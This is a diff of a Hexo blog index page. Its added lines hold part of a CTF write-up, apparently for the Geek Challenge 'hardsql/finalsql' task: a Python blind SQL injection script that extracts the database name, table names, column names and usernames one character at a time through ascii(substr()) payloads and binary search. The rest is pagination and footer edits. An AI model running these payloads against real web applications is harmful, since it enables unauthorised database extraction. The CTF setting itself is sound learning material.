+        mid = (low + high) // 2
+        #payload = &apos;(ascii(substr(database(),%d,1))&gt;%d)&apos; % (i, mid)
+        #payload = &quot;(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=(database())),%d,1))    &gt;%d)&quot;%(i,mid)
+        #payload = &quot;(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=(&apos;F1naI1y&apos;)),%d,1))&gt;    %d)&quot; %(i,mid)
+        payload = &apos;(ascii(substr((select(group_concat(username))from(F1naI1y)),%d,1))&gt;%d)&apos; % (i, mid)
+        r = requests.get(url + payload)
+        time.sleep(0.1)
+        if &quot;Click&quot; in r.text:
+            low = mid + 1
+        else:
+            high = mid
+
+    if low != 32:
+        result += chr(low)
+    else:
+        break
+
+    print(result)</code></pre>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/10/15/极客大挑战（hardsql-finalsql）/">展开全文 >></a>
         </p>
       
 
@@ -872,7 +1102,7 @@
   
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
     </nav>
   
 
@@ -884,7 +1114,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2020 John Doe
+    		&copy; 2021 John Doe
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
